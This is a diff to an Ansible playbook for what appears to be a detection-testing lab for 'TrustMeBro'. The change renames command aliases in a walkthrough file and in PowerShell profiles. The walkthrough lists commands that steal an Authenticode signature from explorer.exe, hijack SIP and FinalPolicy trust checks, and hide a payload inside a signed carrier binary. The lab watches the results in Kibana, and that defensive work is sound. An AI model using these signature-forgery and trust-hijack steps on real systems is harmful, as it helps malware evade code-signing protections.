@@ -351,7 +351,7 @@
       ── STEP 1: Steal a signature ─────────────────────────
 
         cd C:\Demo\TrustMeBro
-        TrustMeBro.exe steal C:\Demo\donors\explorer.exe C:\Demo\unsigned_agent.exe --clone
+        tmb steal C:\Demo\donors\explorer.exe C:\Demo\unsigned_agent.exe --clone
 
         Then copy the signed binary to TARGET:
         copy C:\Demo\unsigned_agent.exe \\10.1.10.30\C$\Temp\agent.exe
@@ -360,14 +360,14 @@
 
         ssh localuser@10.1.10.30
         cd C:\Temp
-        TrustMeBro.exe hijack --sip-types PE
+        tmb hijack --sip-types PE
 
         Log out and log back in. Run C:\Temp\agent.exe
         Check Kibana for alerts (or lack of them).
 
       ── STEP 3: FinalPolicy bypass (on TARGET) ────────────
 
-        TrustMeBro.exe hijack --finalpolicy
+        tmb hijack --finalpolicy
 
         Log out and log back in. Every signature check passes.
         Run any unsigned binary. Check Kibana.
@@ -375,7 +375,7 @@
       ── STEP 4: SigStash payload delivery ─────────────────
 
         On DEVBOX:
-        TrustMeBro.exe embed C:\Demo\payload.bin C:\Demo\donors\explorer.exe C:\Demo\carrier.exe --camouflage
+        tmb embed C:\Demo\payload.bin C:\Demo\donors\explorer.exe C:\Demo\carrier.exe --camouflage
 
         Copy to TARGET:
         copy C:\Demo\carrier.exe \\10.1.10.30\C$\Temp\carrier.exe
@@ -384,7 +384,7 @@
         powershell "(Get-AuthenticodeSignature C:\Temp\carrier.exe).Status"
 
         Extract the hidden payload:
-        TrustMeBro.exe extract C:\Temp\carrier.exe C:\Temp\recovered.bin
+        tmb extract C:\Temp\carrier.exe C:\Temp\recovered.bin
         type C:\Temp\recovered.bin
 
       ── STEP 5: FormatGhost analyst trap ──────────────────
@@ -403,7 +403,7 @@
 
       ── CLEANUP ───────────────────────────────────────────
 
-        On TARGET: TrustMeBro.exe clean --all
+        On TARGET: tmb clean --all
     dest: C:\Users\localuser\Desktop\START_HERE.txt
     force: false
   failed_when: false
@@ -498,11 +498,11 @@
   ansible.windows.win_copy:
     content: |
       # TrustMeBro Lab aliases
-      function tmb { python C:\Demo\TrustMeBro\TrustMeBro.py @args }
+      function tmb { C:\Demo\TrustMeBro\bin\TrustMeBro.exe @args }
       function tmbpy { python C:\Demo\TrustMeBro\TrustMeBro.py @args }
       Set-Location C:\Demo\TrustMeBro
       Write-Host "TrustMeBro Lab Ready" -ForegroundColor Green
-      Write-Host "  tmb   = TrustMeBro.py" -ForegroundColor DarkGray
+      Write-Host "  tmb   = TrustMeBro.exe (bin)" -ForegroundColor DarkGray
       Write-Host "  tmbpy = TrustMeBro.py" -ForegroundColor DarkGray
       Write-Host "  Target: 10.1.10.30  Kibana: https://10.1.10.10:5601" -ForegroundColor DarkGray
     dest: C:\Users\localuser\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
@@ -513,11 +513,11 @@
   ansible.windows.win_copy:
     content: |
       # TrustMeBro Lab aliases
-      function tmb { python C:\Demo\TrustMeBro\TrustMeBro.py @args }
+      function tmb { C:\Demo\TrustMeBro\bin\TrustMeBro.exe @args }
       function tmbpy { python C:\Demo\TrustMeBro\TrustMeBro.py @args }
       Set-Location C:\Demo\TrustMeBro
       Write-Host "TrustMeBro Lab Ready" -ForegroundColor Green
-      Write-Host "  tmb   = TrustMeBro.py" -ForegroundColor DarkGray
+      Write-Host "  tmb   = TrustMeBro.exe (bin)" -ForegroundColor DarkGray
       Write-Host "  tmbpy = TrustMeBro.py" -ForegroundColor DarkGray
       Write-Host "  Target: 10.1.10.30  Kibana: https://10.1.10.10:5601" -ForegroundColor DarkGray
     dest: C:\Users\localuser\Documents\PowerShell\Microsoft.PowerShell_profile.ps1
